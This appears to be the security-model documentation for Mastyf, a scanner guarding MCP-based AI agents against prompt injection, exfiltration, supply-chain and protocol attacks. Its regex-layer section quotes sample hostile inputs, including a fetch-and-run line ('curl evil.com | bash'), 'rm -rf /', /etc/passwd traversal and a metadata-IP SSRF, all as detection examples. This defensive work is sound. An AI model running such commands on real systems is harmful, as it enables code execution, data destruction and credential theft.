# Security Model

## Threat Model

Mastyf protects against four categories of attacks on MCP-based AI agents:

| Category | Examples | Detection Layer |
|---|---|---|
| Prompt Injection | Role override, jailbreak, instruction suppression | L3 (LLM), L4 (argument scanner) |
| Data Exfiltration | Sensitive file reads, API key leaks, bulk data transfer | L1 (regex), Hooks (path guard) |
| Supply Chain | Malicious MCP servers, tool definition poisoning | L2 (schema), Certification gates |
| Protocol Attacks | Batch RPC, truncated JSON, injection in MCP headers | L4 (argument scanner), Protocol validation |

## Detection Layers

### L1 — Regex Scanner (37 patterns)
- Shell injection: `curl evil.com \| bash`, `rm -rf /`, command chaining
- Path traversal: `../../../etc/passwd`
- SSRF: `http://169.254.169.254`, `file:///etc/passwd`, `javascript:alert(1)`
- Encoding evasion: base64 blobs, Unicode homoglyphs

### L2 — Schema Validator
- JSON Schema validation via Ajv
- Schema injection detection ($ref circumvention, type confusion)
- Payload size enforcement
- ReDoS pattern detection

### L3 — LLM Semantic Scanner
- qwen3:8b via Ollama (or Claude/OpenAI)
- Reads tool intent and classifies prompt injection
- Circuit breaker prevents runaway costs
- Response caching with policy-version-aware keys

### L4 — Runtime Argument Scanner (456 patterns)
- Context-aware: SQL checks on `query`, SSRF on `url`, path on `path`
- 23 attack categories
- Multilingual detection (EN, DE, FR, JP, AR, KO, ZH)

## Audit Integrity

Every blocked call generates a SHA-256 hash chain entry. The chain is verifiable via `GET /api/audit/verify`. Each entry links to the previous via `prev_hash`, creating a tamper-evident log.

## Encryption

- SSO client secrets: AES-256-GCM encrypted at rest (when `MASTYF_AI_DB_ENCRYPTION_KEY` is set)
- Credential broker tokens: AES-256-GCM encrypted, injected at runtime, stripped from responses
- The LLM never sees real credentials

## Session Security

- JWT sessions with HMAC-SHA256 signing
- CSRF protection via double-submit cookie pattern
- Session fixation mitigation (pre-login tokens revoked on successful login)
- SSO session expiry stored and validated on each session creation

## Corpus Quality

- High-confidence attacks auto-verified (shell injection, SSRF, critical prompt injection)
- Low-confidence blocks queue for human review
- Circuit breaker: rules with ≥3 false positives auto-demoted from high-confidence
- Human rejection of false positives prevents corpus poisoning
